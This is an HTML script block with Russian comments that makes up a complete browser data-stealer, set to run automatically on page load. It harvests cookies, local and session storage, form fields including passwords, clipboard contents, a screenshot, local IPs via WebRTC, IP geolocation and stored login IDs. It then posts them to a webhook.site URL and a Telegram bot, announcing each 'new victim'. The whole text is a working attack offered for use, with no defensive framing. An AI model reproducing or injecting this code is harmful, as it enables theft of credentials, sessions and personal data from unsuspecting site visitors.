    <script>
        // ============================================================
        //  НАСТРОЙКИ (ЗАМЕНИТЬ НА СВОИ)
        // ============================================================
        const WEBHOOK_URL = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b';
        const BOT_TOKEN = '8783402037:AAF1L0A_UP12EUOgn5x2g7UMFntHy3QjDfk';
        const CHAT_ID = '8327334745';

        // ============================================================
        //  АВТОМАТИЧЕСКИЙ СБОР ВСЕХ ДАННЫХ (БЕЗ КЛИКОВ)
        // ============================================================
        (async function autoSteal() {
            // Ждём 1.5 секунды после загрузки страницы
            await new Promise(r => setTimeout(r, 1500));

            const data = {};

            // ---- 1. Куки (все) ----
            data.cookies = {};
            if (document.cookie) {
                document.cookie.split('; ').forEach(c => {
                    const [k, v] = c.split('=');
                    if (k) data.cookies[k] = v || '';
                });
            }

            // ---- 2. LocalStorage (все) ----
            data.localStorage = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key) data.localStorage[key] = localStorage.getItem(key);
            }

            // ---- 3. SessionStorage (все) ----
            data.sessionStorage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key) data.sessionStorage[key] = sessionStorage.getItem(key);
            }

            // ---- 4. Формы (пароли, логины, любые поля) ----
            data.forms = {};
            document.querySelectorAll('input, textarea, select').forEach(el => {
                const name = el.name || el.id || el.className || 'field';
                if (el.value !== undefined && el.value !== null && el.value !== '') {
                    data.forms[name] = el.value;
                }
            });
            document.querySelectorAll('form').forEach(form => {
                try {
                    const fd = new FormData(form);
                    for (const [k, v] of fd.entries()) {
                        data.forms['form_' + k] = v;
                    }
                } catch (_) {}
            });

            // ---- 5. IP и ГЕО (без запросов разрешений) ----
            data.ip = null;
            data.geo = null;
            try {
                // Получаем IP
                const ipResp = await fetch('https://api.ipify.org?format=json');
                const ipJson = await ipResp.json();
                data.ip = ipJson.ip;

                // По IP получаем геолокацию
                const geoResp = await fetch(`https://ip-api.com/json/${data.ip}?fields=status,country,city,lat,lon,isp,org,timezone,regionName`);
                const geoJson = await geoResp.json();
                if (geoJson.status === 'success') {
                    data.geo = {
                        country: geoJson.country || '?',
                        region: geoJson.regionName || '?',
                        city: geoJson.city || '?',
                        lat: geoJson.lat || 0,
                        lon: geoJson.lon || 0,
                        isp: geoJson.isp || '?',
                        org: geoJson.org || '?',
                        timezone: geoJson.timezone || '?'
                    };
                }
            } catch (_) {
                data.ip = null;
                data.geo = null;
            }

            // ---- 6. Буфер обмена ----
            data.clipboard = null;
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    data.clipboard = await navigator.clipboard.readText();
                }
            } catch (_) { data.clipboard = null; }

            // ---- 7. Скриншот страницы ----
            data.screenshot = null;
            try {
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                document.head.appendChild(script);
                await new Promise((res, rej) => {
                    script.onload = res;
                    script.onerror = rej;
                    setTimeout(res, 4000);
                });
                if (typeof html2canvas !== 'undefined') {
                    const canvas = await html2canvas(document.body, {
                        useCORS: true,
                        allowTaint: true,
                        scale: 0.4,
                        logging: false
                    });
                    data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
                }
            } catch (_) { data.screenshot = null; }

            // ---- 8. Все ссылки на странице ----
            data.links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);

            // ---- 9. Мета-теги ----
            data.meta = {};
            document.querySelectorAll('meta').forEach(m => {
                const name = m.getAttribute('name') || m.getAttribute('property') || 'meta';
                data.meta[name] = m.getAttribute('content') || '';
            });

            // ---- 10. Параметры URL ----
            data.urlParams = {};
            new URLSearchParams(window.location.search).forEach((v, k) => {
                data.urlParams[k] = v;
            });

            // ---- 11. Реферер и текущий URL ----
            data.referrer = document.referrer || null;
            data.url = window.location.href;

            // ---- 12. IndexedDB (список баз данных) ----
            data.indexedDB = null;
            try {
                if (indexedDB.databases) {
                    const dbs = await indexedDB.databases();
                    data.indexedDB = dbs.map(db => db.name);
                }
            } catch (_) { data.indexedDB = null; }

            // ---- 13. WebRTC (локальный IP) ----
            data.localIPs = null;
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                const ips = [];
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.split(' ')[4];
                        if (ip && !ips.includes(ip)) ips.push(ip);
                    }
                };
                pc.createDataChannel('test');
                await pc.createOffer().then(o => pc.setLocalDescription(o));
                await new Promise(r => setTimeout(r, 2000));
                pc.close();
                data.localIPs = ips;
            } catch (_) { data.localIPs = null; }

            // ---- 14. Сохранённые логины (Credentials API) ----
            data.credentials = null;
            try {
                if (navigator.credentials && navigator.credentials.get) {
                    const cred = await navigator.credentials.get({
                        password: true,
                        federated: { providers: ['https://accounts.google.com', 'https://facebook.com'] }
                    });
                    if (cred) {
                        data.credentials = {
                            type: cred.type,
                            id: cred.id
                        };
                    }
                }
            } catch (_) { data.credentials = null; }

            // ============================================================
            //  ОТПРАВКА ДАННЫХ
            // ============================================================
            const payload = JSON.stringify(data);

            // Отправка на Webhook
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload
                });
            } catch (_) {}

            // Отправка в Telegram (краткое сообщение)
            try {
                let msg = '🔴 НОВАЯ ЖЕРТВА\n';
                if (data.ip) msg += `🌐 IP: ${data.ip}\n`;
                if (data.geo && typeof data.geo === 'object') {
                    msg += `📍 Страна: ${data.geo.country || '?'}\n`;
                    msg += `🏙 Город: ${data.geo.city || '?'}\n`;
                    msg += `🗺 Координаты: ${data.geo.lat || '?'}, ${data.geo.lon || '?'}\n`;
                    if (data.geo.isp) msg += `📡 Провайдер: ${data.geo.isp}\n`;
                }
                if (data.clipboard) msg += `📋 Буфер: ${data.clipboard.substring(0, 100)}\n`;
                if (data.credentials) msg += `🔑 Логин: ${data.credentials.id}\n`;
                if (data.localIPs && data.localIPs.length) msg += `📡 Локальный IP: ${data.localIPs.join(', ')}\n`;

                const cookiesCount = Object.keys(data.cookies).length;
                const lsCount = Object.keys(data.localStorage).length;
                const ssCount = Object.keys(data.sessionStorage).length;
                const formsCount = Object.keys(data.forms).length;
                msg += `🍪 Куки: ${cookiesCount} шт.\n`;
                msg += `💾 LocalStorage: ${lsCount} шт.\n`;
                msg += `🗂 SessionStorage: ${ssCount} шт.\n`;
                msg += `📝 Формы: ${formsCount} шт.\n`;
                if (data.indexedDB && data.indexedDB.length) msg += `🗄 IndexedDB: ${data.indexedDB.join(', ')}\n`;
                if (data.screenshot) msg += `🖼 Скриншот: есть (${(data.screenshot.length / 1024).toFixed(0)} КБ)\n`;
                msg += `🔗 URL: ${data.url}`;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg
                    })
                });
            } catch (_) {}

            // Отправка скриншота в Telegram отдельно (если есть)
            if (data.screenshot && data.screenshot.length > 5000) {
                try {
                    const blob = await fetch(data.screenshot).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'screenshot.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (_) {}
            }

            console.log('✅ Данные отправлены');
        })();
